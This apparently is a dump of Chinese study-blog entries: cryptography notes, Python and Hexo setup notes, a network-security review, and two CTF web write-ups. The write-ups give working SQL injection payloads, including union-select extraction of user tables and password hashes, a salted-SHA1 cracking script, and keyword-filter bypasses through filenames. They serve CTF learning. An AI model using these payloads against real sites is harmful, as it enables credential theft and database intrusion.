𝑔^𝑟 (𝑚𝑜𝑑 𝑝)；𝑐2 ＝ 𝑚∙𝑦^𝑟(𝑚𝑜𝑑 𝑝) 用户A把二元组 (𝒄𝟏 ,𝒄𝟐) 作为密文传送给用户B3.解密用户B接收到密文二元组(𝑐1 ,𝑐2)后，做解密计算：𝒎=𝒄𝟐∙(𝒄𝟏^𝒙 )^(−𝟏) 𝒎𝒐𝒅 𝒑 4.ElGamal算法特点： 非确定性：由于密文依赖于加密过程中用户A选择的随机数𝑟 ，所以加密相同的明文可能会产生不同的密文—概率加密 密文空间大于明文空间：明文空间为〖𝑍_𝑝〗^∗，而密文空间为〖𝑍_𝑝〗^∗×〖𝑍_𝑝〗^∗ElGamal的安全性 公钥密码体制ECC(椭圆曲线密码体制)基于椭圆曲线离散对数问题可用更短的密钥获得同RSA一样的安全性 椭圆曲线上的运算 𝒪 称为加法单位元，对ECC上任意点𝑃：𝑃＋𝒪 ＝𝑃 加法逆元：ECC上的点𝑃 的加法逆元−𝑷定义为：具有相同 𝒙 坐标和负𝒚 坐标的点，即过𝑃点的垂线与曲线相交的另外一点 对ECC上𝑥 坐标不同的两点𝑃、𝑄，点加𝑷+𝑸定义为：连接𝑃和𝑄的直线和曲线相交于点𝑅，则𝑃+𝑄的值为𝑅的加法逆元 倍点𝑷+𝑷运算定义：做点𝑃的切线，设切线与ECC交于点𝑅，则倍点为𝑅的逆元，即：2𝑃 =𝑃+𝑃= −𝑅 类似：𝑘𝑃=𝑃+𝑃+𝑃+…+𝑃 有限域上椭圆曲线加法 椭圆曲线密码算法1.密钥对生成2.加密算法3.解密算法小结 公钥体制的问题缺少身份认证机制==&gt;基于身份的加密体制IBE 公钥密码体制的安全性公钥密码的优点（与对称密码相比） 密钥分发简单 需秘密保存的密钥量少 可以满足互不认识的人之间私人谈话的保密性 可以实现数字签名和认证的功能 公钥密码的不足（与对称密码相比） 公钥密码算法比对称密码算法慢 公钥密码算法提供更多的信息对算法进行攻击，如公钥密码算法对选择明文攻击是脆弱的，尤其明文集比较小时 数据扩展 公钥密码算法一般是建立在特定的数学难题之上，往往这种困难性只是一种设想 #补充 解决对称加密和公钥加密中的不足-混合加密","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"},{"name":"密码学","slug":"notes/密码学","permalink":"https://singlemindedt.github.io/categories/notes/密码学/"}],"tags":[]},{"title":"分组密码","slug":"分组密码","date":"2019-12-18T08:28:39.000Z","updated":"2019-12-20T01:28:23.523Z","comments":true,"path":"2019/12/18/分组密码/","link":"","permalink":"https://singlemindedt.github.io/2019/12/18/分组密码/","excerpt":"","text":"概念将明文划分成长为𝑚(如𝑚=64或128)的分组𝑃＝(𝑝0, 𝑝1, 𝑝2, ….,𝑝(𝑚−1))，各明文分组分别在长为t的密钥𝐾＝(𝑘0, 𝑘1, 𝑘2, ….,𝑘(𝑡−1)) 的控制下变换成长为𝑛的密文分组𝐶＝(𝑐0, 𝑐1, 𝑐2, …,𝑐_(𝑛−1))。(一般 𝑚=𝑛) 特点速度快、安全性较高、易于标准化和便于软硬件实现构造伪随机数生成器、序列密码、消息认证码和Hash函数的方法 设计要求1.分组长度要足够大假设𝑛为分组长度，则要使2𝑛足够大，防止明文穷举攻击2.密钥量要足够大防止密钥穷举攻击3.密码变换要足够复杂使攻击者除穷举攻击外，找不到其他简洁的数学攻击方法4.加密和解密运算简单便于软件和硬件的实现5.无数据扩展和压缩 设计思想扩散扩散原则（移位）：密钥或明文的每一比特变化影响密文的许多比特的变化，以便隐蔽明文的统计特性(形象的称为雪崩效应) 混淆混淆原则（替代）：又称混乱原则，指密钥和明文以及密文之间的依赖关系尽可能的复杂化，以防通过统计分析法进行破译（混乱必须是可逆的！） 原理乘积密码扩散和混乱两种基本密码操作的组合变换(乘积密码) 乘积密码的实现—SPN网络S变换起混淆的作用； P变换起扩散的作用SPN具有雪崩效应：输入(明文或密钥)即使只有很小的变化，也会导致输出有很大的变化 分组密码算法DES###算法描述^-^:(1) DES的加密流程图 初始置换IP和初始逆置换IP-1(如原来第58位的数据置换后放在第1位) 16轮迭代在每轮迭代中，64位的中间结果被分成左右两部分，且作为相互独立的32位数据进行处理。每轮迭代的输入是上轮的结果𝐿𝑖－1和𝑅𝑖－1 加密函数F E扩展置换E-扩展：32比特扩展为48比特 扩展方法：每个输入分组的4位作为6位输出分组的中间4位，6位输出分组中的第1、6位分别由相邻两个4位分组的最外面两位扩散进入到本分组，其中第1个分组的左侧相邻分组为最后1个分组 ###与子密钥异或将E盒扩展得到的48位输出与子密钥𝐾𝑖进行异或运算 压缩替换S-盒：由8个S-盒构成, 每个S-盒都是6比特的输入，4比特的输出𝑠𝑖(ℎ1ℎ2ℎ3ℎ4ℎ5ℎ6)的值是对应表𝑠𝑖中(ℎ1ℎ6)行和(ℎ2ℎ3ℎ4ℎ5)列上的值 S-盒的构造（计算题） P-置换P-置换对8个S-盒的输出进行变换 DES的解密过程 DES子密钥生成DES子密钥是从初始密钥(种子密钥)产生的 种子密钥𝐾为64位，其中有8位用于奇偶校验，分别位于第8，16，24，32，40，48，56，64位 奇偶校验位用于检查密钥𝐾在产生和分配以及存储过程中可能发生的错误 DES的密钥实际上只有56位* DES的安全性 对DES的S盒、迭代次数、密钥长度等设计准则的争议 DES存在一些弱密钥和半弱密钥 DES的56位密钥无法抵抗穷举攻击 代数结构存在互补对称性弱密钥 给定初始密钥𝑲生成子密钥时，将种子密钥（去除了奇偶校验位后）分成两个部分，如果𝑲使得这两部分的每一部分的所有位置全为0或1，则经子密钥产生器产生的各个子密钥都相同，即𝑲𝟏=𝑲𝟐=…=𝑲𝟏𝟔，则称密钥𝑲为弱密钥（共有4个） 若𝑲为弱密钥，则对任意的64比特信息有：***𝑬𝒌(𝑬𝒌(𝒎))= 𝒎 和 𝑫𝒌(𝑫𝒌(𝒎))= 𝒎*** 半弱密钥 半弱密钥：把明文加密成相同的密文，即存在两个不同的密钥𝒌和𝒌′,使得𝑬𝒌 (𝒎)=𝑬(𝒌^′ ) (𝒎) 具有下述性质：若𝒌和𝒌′为一对弱密钥，𝒎为明文组，则有： 𝑬(𝒌^′ ) (𝑬_𝒌 (𝒎))=𝑬_𝒌 (𝑬(𝒌^′ ) (𝒎))=𝒎*互补性 对明文𝒎逐位取补，记为𝒎 ̅，密钥𝑲逐位取补，记为𝒌 ̅ ， 若𝒄=𝑬𝒌(𝒎)，则有𝒄 ̅=𝑬_𝒌 ̅ (𝒎 ̅) ，称为算法上的互补性由算法中两次异或运算的配置决定：两次异或运算一次在S盒之前，一次在P盒置换之后 若对DES 的明文和密钥同时取补，则扩展运算E的输出和子密钥产生器的输出也都取补，因而经异或运算后的输出和未取补时的输出一样，即到达S盒的输入数据未变，输出自然也不变，但经第二个异或运算时，由于左边数据已取补，因而输出也就取补 互补性使DES在选择明文攻击下所需的工作量减半 多重DES3DES AES","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"},{"name":"密码学","slug":"notes/密码学","permalink":"https://singlemindedt.github.io/categories/notes/密码学/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"baby_web+FlatScience","slug":"baby-web","date":"2019-12-18T00:36:20.000Z","updated":"2019-12-30T05:00:31.351Z","comments":true,"path":"2019/12/18/baby-web/","link":"","permalink":"https://singlemindedt.github.io/2019/12/18/baby-web/","excerpt":"","text":"[TOC] baby_web题目提示：想想初始页面是哪个 实际操作：考虑到可能是页面302重定向抓包得到flag FlatScience实际操作点进去有好多链接，下载PDF，跳回等； 查看robots.txt(robots.txt:是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。)访问:http://111.198.29.45:34978/robots.txt 123User-agent: *Disallow: /login.phpDisallow: /admin.php 访问login.php:得到了一个登陆页面，尝试sqli,提示： 12Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: \"2801497d9ca18eef4382b18d1889b8bc97e28461\" in /var/www/html/login.php on line 47Some Error occourred! 可以看到使用的是SQLite数据库,还有加密操作？ 访问网页源码： 有参数提示debug;尝试访问login.php?debug得到如下php代码： 1234567891011121314151617181920212223242526&lt;?phpif(isset($_POST['usr']) &amp;&amp; isset($_POST['pw']))&#123; $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-&gt;query(\"SELECT id,name from Users where name='\".$user.\"' and password='\".sha1($pass.\"Salz!\").\"'\"); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo \"&lt;br&gt;Some Error occourred!\"; &#125; if(isset($row['id']))&#123; setcookie('name',' '.$row['name'], time() + 60, '/'); header(\"Location: /\"); die(); &#125;&#125;if(isset($_GET['debug']))highlight_file('login.php');?&gt; 可以看到SQL的查询语句，并且对密码进行了加密操作(sha1+salt&lt;=（alz！）);页面注入不成，抓包分析下：构造： 1usr='union select name,sql from sqlite_master--+n&amp;pw=233 得到： 1Set-Cookie: name=+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29; URL编码转换一下：%27=&gt;’;%28=&gt;(;%29=&gt;); 12CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255)) 看到Users表、id,name,password.hint字段；构造查询语句： 12345idusr='union select id,id from Users limit 0,1--&amp;pw=233usr='union select id,id from Users limit 1,1--&amp;pw=233usr='union select id,id from Users limit 2,1--&amp;pw=233得到3个id； 1234usr='union select id,name from Users limit 0,1--&amp;pw=233usr='union select id,name from Users limit 1,1--&amp;pw=233usr='union select id,name from Users limit 2,1--&amp;pw=233得到name：admin、fritze、hansi 1234567usr='union select id,password from Users limit 0,1--&amp;pw=233usr='union select id,password from Users limit 1,1--&amp;pw=233usr='union select id,password from Users limit 2,1--&amp;pw=233得到password：3fab54a50e770d830c0416df817567662a9dc85c54eae8935c90f467427f05e4ece82cf569f8950734b0bb7c304949f9ff2fc101eef0f048be10d3bd 1234567usr='union select id,hint from Users limit 0,1--&amp;pw=233usr='union select id,hint from Users limit 1,1--&amp;pw=233usr='union select id,hint from Users limit 2,1--&amp;pw=233得到hint：my+fav+word+in+my+fav+paper%3F%21my+love+is%E2%80%A6%3Fthe+password+is+password 根据admin用户的提示my fav word in my fav paper？！应该是：密码+”Salz!”做sha1处理，密码应该就产生于pdf中； 因为我门知道了加密结果直接解密去掉Salz就得到密码了： 解密 也可以用pdf中的单词进行+Salz!再做sha1； 借用一下别人的Python脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041from cStringIO import StringIOfrom pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreterfrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom pdfminer.pdfpage import PDFPageimport sysimport stringimport osimport hashlib def get_pdf(): return [i for i in os.listdir(\"./\") if i.endswith(\"pdf\")] def convert_pdf_2_text(path): rsrcmgr = PDFResourceManager() retstr = StringIO() device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams()) interpreter = PDFPageInterpreter(rsrcmgr, device) with open(path, 'rb') as fp: for page in PDFPage.get_pages(fp, set()): interpreter.process_page(page) text = retstr.getvalue() device.close() retstr.close() return text def find_password(): pdf_path = get_pdf() for i in pdf_path: print \"Searching word in \" + i pdf_text = convert_pdf_2_text(i).split(\" \") for word in pdf_text: sha1_password = hashlib.sha1(word+\"Salz!\").hexdigest() if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c': print \"Find the password :\" + word exit() if __name__ == \"__main__\": find_password() 知识补充‘’’os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。它不包括 . 和 .. 即使它在文件夹中。只支持在 Unix, Windows 下使用。语法listdir()方法语法格式如下：os.listdir(path)参数:path – 需要列出的目录路径返回值:返回指定路径下的文件和文件夹列表。‘’’‘’’endswith() 方法用于判断字符串是否以指定后缀结尾，如果以指定后缀结尾返回True，否则返回False。可选参数”start”与”end”为检索字符串的开始与结束位置。‘’’‘’’hashlib是涉及安全散列和消息摘要，提供多个不同的加密算法接口，如SHA1、SHA224、SHA256、SHA384、SHA512、MD5等。其中hash.digest()返回摘要，作为二进制数据字符串值hash.hexdigest()返回摘要，作为十六进制数据字符串值‘’’ 得到密码：ThinJerboa访问：admin.php 12username=adminpassword=ThinJerboa 得到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Python笔记1","slug":"Python笔记1","date":"2019-12-16T14:47:15.000Z","updated":"2019-12-18T15:38:21.297Z","comments":true,"path":"2019/12/16/Python笔记1/","link":"","permalink":"https://singlemindedt.github.io/2019/12/16/Python笔记1/","excerpt":"","text":"报误：SyntaxError: unexpected EOF while parsing一般是最后一行括号没补全，或者写了for循环没写循环体，因为解释器到底了度没找到它要找到的东西 Python逻辑运算符and or not 优先级：() &gt; not &gt; and &gt; orhttps://www.cnblogs.com/zhangyanran/p/9896070.html Python lower() 方法转换字符串中所有大写字符为小写。语法lower()方法语法：str.lower() ord() 函数是 chr() 函数（对于8位的ASCII字符串）或 unichr() 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值，如果所给的 Unicode 字符超出了你的 Python 定义范围，则会引发一个 TypeError 的异常。语法以下是 ord() 方法的语法:ord(c) Python join()描述Python join() 方法用于将序列中的元素以指定的字符连接生成一个新的字符串。 语法join()方法语法： str.join(sequence) Python chr() 函数描述chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。语法以下是 chr() 方法的语法:chr(i)参数i – 可以是10进制也可以是16进制的形式的数字。 Python isalpha() 方法检测字符串是否只由字母组成。 语法isalpha()方法语法： str.isalpha() raw_inputinput它会根据用户输入变换相应的类型,而且如果要输入字符和字符串的时候必须要用引号包起来,而raw_input则是不管用户输入什么类型的都会转变成字符型. 切片https://www.jianshu.com/p/15715d6f4dad Python int() 函数Python 内置函数 Python 内置函数描述int() 函数用于将一个字符串或数字转换为整型。语法以下是 int() 方法的语法:class int(x, base=10)参数x – 字符串或数字。base – 进制数，默认十进制。返回值返回整型数据。","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"},{"name":"Python","slug":"notes/Python","permalink":"https://singlemindedt.github.io/categories/notes/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://singlemindedt.github.io/tags/Python/"}]},{"title":"upload","slug":"upload","date":"2019-12-16T00:14:47.000Z","updated":"2019-12-30T06:03:49.230Z","comments":true,"path":"2019/12/16/upload/","link":"","permalink":"https://singlemindedt.github.io/2019/12/16/upload/","excerpt":"","text":"upload初探 根据题目upload猜测可能为文件上传漏洞，先注册为会员(username:111111;password:111111); 登录就出现了上传文件的页面如下： 尝试上传文件，发现只有jpg格式的文件可以上传尝试上传php.jpg 1&lt;?php echo phpinfo();?&gt; burpsuite抓包改后缀名为php得到结果回应为文件格式错误，应该是服务器端的检查，而非客户端Js过滤； 分析：题目限制了上传文件的后缀名必须为jpg，但并没有对文件内容有所检查；图片马的方法不可行，上传成功后并没有目录，同时无法上传.htaccess对图片马解析； 参阅相关资料发现似乎是利用文件名注入，并且通过每次上传成功后的回显uid is ：1660 大概能够猜测应该是利用文件名对后端数据库进行注入；*后端插入语句： 12INSERT INTO 表名VALUES（被插入新行中的值） 实际操作： 构造payload：（文件名）1'+(select database())+'.jpg 可以看到select被过滤了，尝试双写绕过： 1'+(selselectect database())+'.jpg 页面回显均为0； 尝试转换格式：转为16进制：1'+(selselectect hex(database()))+'.jpg 页面回显为：7765625 分析(回显16进制为纯数字，可能过滤字母；且可能回显位不全)转10进制输出:1'+(selselectect conv(hex(database()),16,10))+'.jpg *MySQL CONV（）将一个数字从一个数字基数系统转换为另一个数字基数系统。转换后，函数返回数字的字符串表示形式。当定义的参数为NULL时，返回值将为NULL。最小基数为2，最大基数为36.如果要转换的基数为负数，则该数字被视为带符号数。否则，它被视为未签名。该函数出现在MySQL版本：5.6语法： 1CONV(N,from_base,to_base) 页面回显为：1.8446744073709552e19 分析(回显科学计数法，应该是输出位数过长)使用substr分割输出：1'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg 页面回显为：131277325825392 转16进制再转为ascll,得到：web_up123456789def changeascll(number): number=str(hex(number))[2:] s1=[number[i:(i+2)]for i in range(0,len(number),2)] s2=[int(i,16)for i in s1] s3=[chr(i)for i in s2] s=\"\".join(s3) print(s)changeascll(131277325825392) 提取后半部分字符：1819238756 1'+(selselectect conv(substr(hex(database()),13,12),16,10))+'.jpg 得到数据库名：web_upload 同样使用上述方法爆表payload：1'+(selecselectt conv(substr(hex((selecselectt table_name frofromm information_schema.tables where table_schema='web_upload' limit 1,1)),1,12),16,10))+'.jpg 114784820031327112615676665705126853610566245得到表名：hello_flag_is_here 爆字段payload:1'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg 1158583773673987102823得到字段名：i_am_flag 爆值payload：1'+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg 3642721569519992806431727430560750951 得到值：1!!_@m_Th.e_F!lag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"安装PyCharm","slug":"安装PyCharm","date":"2019-12-13T00:47:41.000Z","updated":"2019-12-13T04:52:54.257Z","comments":true,"path":"2019/12/13/安装PyCharm/","link":"","permalink":"https://singlemindedt.github.io/2019/12/13/安装PyCharm/","excerpt":"","text":"起因^-^原来用的IDLE，功能很少，就来安装了PyCharm；很简单的安装，一步步坐下来就好；由于之前用IDLE都是在安装路径下运行的，故没有配置环境变量；方便起见配一下；控制面板-系统-高级系统设置-环境变量-系统变量-Path-添加路径； 经过orz安装Python自己在python -v/V上凌乱了，以为是之前安装的一些东西搞坏了，还是重装了QAQ；安装python：https://baijiahao.baidu.com/s?id=1606573927720991570&amp;wfr=spider&amp;for=pc检查环境变量的时候会发现，添加在了用户变量并且添加了两个： 12E:\\newpython3.8.0\\install_location\\Scripts\\E:\\newpython3.8.0\\install_location\\ 12*系统变量：对所有的用户起作用*用户变量：对当前用户起作用 powershell中执行python -V —查看版本(注意是大写V，小写v会抛出很多东西)； 12python -v 小写v:这是版本信息，包括库版本python -V 大写v：只看python的版本 (记录一下，未删去原来的版本3.7.4；怕原来配置的一些东西又用不了了) 安装PyCharm一路傻瓜操作； 进入软件：1.Create New ProjectLocation(存放工程路径),可自行修改，但是最好为空；点击▶project…能看到PyCharm已经获取了3.8.0解释器Base interpreter:路径…python.exeCreate2.等，Tip-&gt;Close添加Project InterpreterFilesettingsOK 3.试运行FilenewPython File输入name ok编写程序运行 结果？？？","categories":[],"tags":[{"name":"环境安装","slug":"环境安装","permalink":"https://singlemindedt.github.io/tags/环境安装/"}]},{"title":"cmd下输入python弹出应用商店","slug":"cmd下输入python弹出应用商店","date":"2019-12-12T16:57:32.000Z","updated":"2019-12-13T04:56:49.241Z","comments":true,"path":"2019/12/13/cmd下输入python弹出应用商店/","link":"","permalink":"https://singlemindedt.github.io/2019/12/13/cmd下输入python弹出应用商店/","excerpt":"","text":"问题：cmd/powershall下运行python均弹窗应用商店解决：在环境变量中可以看到第一条为：%USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps%USERPROFILE% : 当前用户配置文件(Profile文件)位置备份后删除，解决！","categories":[],"tags":[{"name":"环境变量","slug":"环境变量","permalink":"https://singlemindedt.github.io/tags/环境变量/"}]},{"title":"序列密码(流密码)","slug":"密码学复习","date":"2019-12-12T07:56:05.000Z","updated":"2020-01-01T11:47:57.040Z","comments":true,"path":"2019/12/12/密码学复习/","link":"","permalink":"https://singlemindedt.github.io/2019/12/12/密码学复习/","excerpt":"","text":"序列密码(流密码)对称密码体制；一次只对明文消息的单个字符(通常是二进制1位)进行加解密变换；具有算法实现简单、速度快、错误传播少等特点； “一次一密”明显缺陷：密钥需要和明文一样长，使密钥的分发和管理困难；故：序列密码设计的思路：从一个短的密钥产生一个随机的密钥序列(由于密钥序列使随机的，计算能力有限的攻击者无法从已知的密钥序列片段中获得其他密钥序列位任何有用信息) 定义明文消息按字符(如二元数字)逐字符的加密；序列密码的加密用一个随机序列(密钥流)与明文序列按位叠加产生密文，用同一随机序列与密文序列叠加来恢复明文； 原理 分类序列密码通常划分为两类：1.同步序列密码2.自同步序列密码 密钥流与密钥生成器密钥流算法应该能产生随机性和不可预测性*好的密钥序列*保持同步是序列密码在实际应用中的关键**现实：密钥流都是按密钥生成算法生成，且要求通信双方能产生相同的密钥序列，所以不可能是真随机的——伪随机序列 密钥流要求1.极大的周期(算法产生的序列都是周期性的，非随机序列)2.良好的统计特征(有均匀的游程分布)@@@游程：序列中相同符号的连续段，其前后均为异种符号 游程：称序列中连续的i个1为长度等于i的1游程， 同样，称序列中连续的i个0为长度等于i的0游程。 ​ ……0 111 0000 10……​ 有长为3的1游程、长为4的0游程、长为1的1游程。一般要求其在周期内满足：同样长度的0游程和1游程的个数相等，或近似相等看作环处理： 问题 个数 位置 长度为1的1游程有几个 1个 0111000010 长度为1的0游程有几个 0个 0111000010(需要前后异号) 长度为2的0游程有几个 1个 0111000010 3.很高的线性复杂度不能用级数较小的线性移位寄存器LFSR近似代替 4.用统计方法由密钥序列k0k1k2…ki…提取密钥生成器结构或种子密钥在计算上不可行密钥流生成器的组成1.驱动部分控制生成器的状态序列，为非线性组合部分提供统计性能良好的序列周期很大分布较随机 2.非线性组合部分F将驱动部分提供的序列组合成密码特性好的序列可隐蔽驱动序列与密钥k之间明显的依赖关系 组成@ 通常由线性移位寄存器(LFSR)和一个非线性组合函数即布尔函数组合，构成一个密钥流生成器。 线性反馈移位寄存器LFSR给定初始状态，写出输出序列；线性反馈移位寄存器（LFSR）； 1.原理：移位寄存器：移入端移入一位，移出端移出一位；结合反馈函数f:选取移位寄存器中的一些单元进行异或操作，反馈给输入端 1.n级LFSR最多有2^n个不同的状态初始状态为零，则其状态恒为零若其初始状态非0，则其后继状态不会为0因此n级LFSR的状态周期≤2^(n)-1**2.输出序列的周期与状态周期相等，所以≤2^n-13.选择合适反馈函数(具有特定抽头序列)，才可使序列周期达到最大值2^(n)-1，周期达到最大值的输出序列称为m序列 LFSR生成最大周期序列条件：其生成多项式(由抽头序列加上常数1形成的多项式)必须是本原多项式，多项式的阶为移位寄存器的级数。 n位寄存器中的初始值称为初态，初态对输出序列的周期没有影响；周期取决于LFSR所使用的反馈函数 解密密文只需运行具有相同初始状态的LFSR即可(循环回初始值，密钥序列开始重复) 特征多项式…定理：n级LFSR产生的序列有最大周期2^(n)-1的必要条件是其特征多项式为不可约 定义：若n次不可约多项式p(x)的阶为2^(n)-1，则称p(x)是n次本原多项式使得p(x)|(x^(p)-1)的最小正整数p称为p(x)的阶 定理：设{ai}∈G(p(x))，{ai}为m序列的充要条件是p(x)为本原多项式； m序列码的破译1.2. 非线性组合部分基于LFSR的序列密码（对一个LFSR进行非线性组合）： 常见的基于LFSR的密钥序列发生器1.Geffe发生器2.钟控发生器3.交错停走式发生器4.门限发生器常见的流密码算法1.RC4基于非线性数组变换；它以一个足够大的数组为基础，对其进行非线性变换，产生非线性的密钥流序列；优点：容易用软件实现，加解密速度快（大约比DES快10倍） RC4主要算法1.密钥调度算法（KSA）2.伪随机数生成算法（PRGA） A5A5算法已被应用于GSM通信系统中，用于加密从手机到基站的连接，以保护语音通信。一个GSM语言消息被转换成一系列的帧，每帧长228位，每帧用A5进行加密 序列序列密码相对于分组密码的优点","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://singlemindedt.github.io/categories/cryptography/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"hexo卡通挂件踩坑记","slug":"hexo卡通挂件踩坑记","date":"2019-12-12T07:30:52.000Z","updated":"2019-12-12T07:31:43.276Z","comments":true,"path":"2019/12/12/hexo卡通挂件踩坑记/","link":"","permalink":"https://singlemindedt.github.io/2019/12/12/hexo卡通挂件踩坑记/","excerpt":"","text":"添加卡通人物： 1.安装hexo-helper-live2d1nmp install -save hexo-helper-live2d 2.安装live2d1nmp install live2d-widget-model-tororo 注意：可能出现报错可以尝试更新nmp版本： 1nmp install -g nmp 3.配置在hexo站点配置文件_config.yml，或者主题配置文件_config.yml中添加如下配置 123456789101112131415161718192021#宠物live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ model:# use: live2d-widget-model-tororo use: live2d-widget-model-hijiki# use: live2d-widget-model-wanko display: position: right #位置 width: 150 #宽度 height: 300 #高度# 水平位置# hOffset: 0# 垂直位置# vOffset: -20 mobile: show: false #是否在手机端显示 4.部署1hexo g -d 彻底卸载12nmp uninstall hexo-helper-live2d再删除_config.yml下的配置信息； 在博客根目录下package.json文件中可以看到依赖： 安装的live2d模块在根目录的node_moduels文件下； 问题出现了明明安装的tororo但是显示的却是shizuku ??? 将配置文件删除；hexo clean ;hexo g -d;刷新还是有，而且原来配置的在手机端不显示的也同样在显示 …？？？？ 尝试在博客根目录下的_config.yml中添加配置代码： 12345678910111213141516171819202122# Live2D## https://github.com/xiazeyu/live2d-widget.js## https://l2dwidget.js.org/docs/class/src/index.js~L2Dwidget.html#instance-method-initlive2d: model: scale: 1 hHeadPos: 0.5 vHeadPos: 0.618 use: live2d-widget-model-tororo // 下载的动画模型名称 display: superSample: 2 width: 120 height: 200 position: right // 模型在网页显示位置 hOffset: 20 vOffset: 50 mobile: show: false // 移动设备是否显示 scale: 0.5 react: opacityDefault: 0.7 opacityOnHover: 0.2 这下可好了，啥都不显示了QAQ 放在主题下的_config.yml中看看： 模型显示了，不过还是老样子不匹配orz…而且手机端也正常显示。。。 接下来是不是要开始纯净卸载了呢😂3 2 1 Action!……记得多刷新几次！…干净了~舒服！ 尝试手动下载安装：安装模块： 1npm install --save hexo-helper-live2d 直接在github上下载模块：地址：https://github.com/xiazeyu/live2d-widget-models解压将packages里面的所有文件拷贝到博客根目录的node_moduels文件夹下； 打开主题下的配置文件_config.yml，添加如下内容： 123456789101112131415161718live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false debug: false model: use: live2d-widget-model-tororo display: position: right width: 150 height: 300 mobile: show: false react: opacity: 0.7 #不透明度 hexo cleanhexo g -d 老样子，显示不匹配！！！😭","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://singlemindedt.github.io/tags/hexo/"}]},{"title":"网络安全复习","slug":"网络安全复习","date":"2019-12-09T07:19:00.000Z","updated":"2019-12-11T10:36:37.105Z","comments":true,"path":"2019/12/09/网络安全复习/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/网络安全复习/","excerpt":"","text":"网络安全概述1.网络安全的威胁来源（分类）信息泄露、信息破坏、拒绝服务 2.CIA三元组与网络安全基本需求网络安全的基本属性（CIA三元组）：机密性、完整性、可用性五个属性：CIA+可靠性+不可抵赖性八个属性：五+隐私性+可说明性+可审计性 3.网络攻击类型（主动/被动）1.阻断攻击（DoS）2.截取攻击3.篡改攻击4.伪造攻击5.重放攻击 4.OSI安全体系（安全服务与安全机制）安全策略指在一个特定的环境里（安全区域），为保证提供一定级别的安全保护所必须遵守的一系列条列、规则。 安全服务指用于提高网络中信息传输、存储和处理过程安全的服务。5个安全服务：认证：提供对通信中对等实体和数据来源的鉴别访问控制：防止对资源的非授权使用机密性：对数据提供保护，防止被非授权泄露完整性：保证信息精确的从起点到终点，不受真实性、完整性和顺序性的攻击不可否认：提供源发证明和交付证明，是通信双方均不可抵赖 安全机制是一种技术或措施，一种软件或者实施一个或多个安全服务的过程。8个安全机制：加密、数字签名、访问控制、信息完整性、鉴别交换、业务量填充、路由控制、公证 5.等级保护制度对不同对象、事件，分等级响应、处置。五级：用户自主保护级-&gt;系统审计保护级-安全标记保护级-结构化保护级-访问验证保护级每级安全技术要求：5个：物理安全、网络安全、主机系统安全、应用安全、数据安全 黑客攻击流程&amp;渗透测试6.黑客攻击流程(重点-简答题)踩点-&gt;扫描-&gt;查点-&gt;访问（获取访问权限失败-&gt;拒绝服务）-&gt;提权-&gt;窃取信息-&gt;掩盖踪迹-&gt;创建后门 收集信息阶段：踩点、扫描、查点 7.踩点找出感兴趣的目标，并收集与目标相关的信息的过程；途径：1.公开信息源搜索2.WHOIS查询3.DNS查询:dig、nslookup、fierce4.网络侦察：利用Unix/Linux下系统提供的traceroute程序、Windows下tracert探查网络拓补结构; 8.渗透测试步骤(重点-简答题)1.前期交互2.情报收集3.威胁建模4.漏洞分析5.渗透攻击（MSF）6.后渗透攻击7.报告 9.常用命令与工具(掌握)ping,nslookup,host,hostnew,traceroute(tracert),nmap,telnet,net,dig,whois ping:（1）用来检测网络的连通情况和分析网络速度； （2）根据域名得到服务器IP； （3）根据ping返回的TTL值来判断对方所使用的操作系统及数据包经过路由器数量。 我们通常会用它来直接ping IP地址，来测试网络的连通情况。 nslookup:用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题 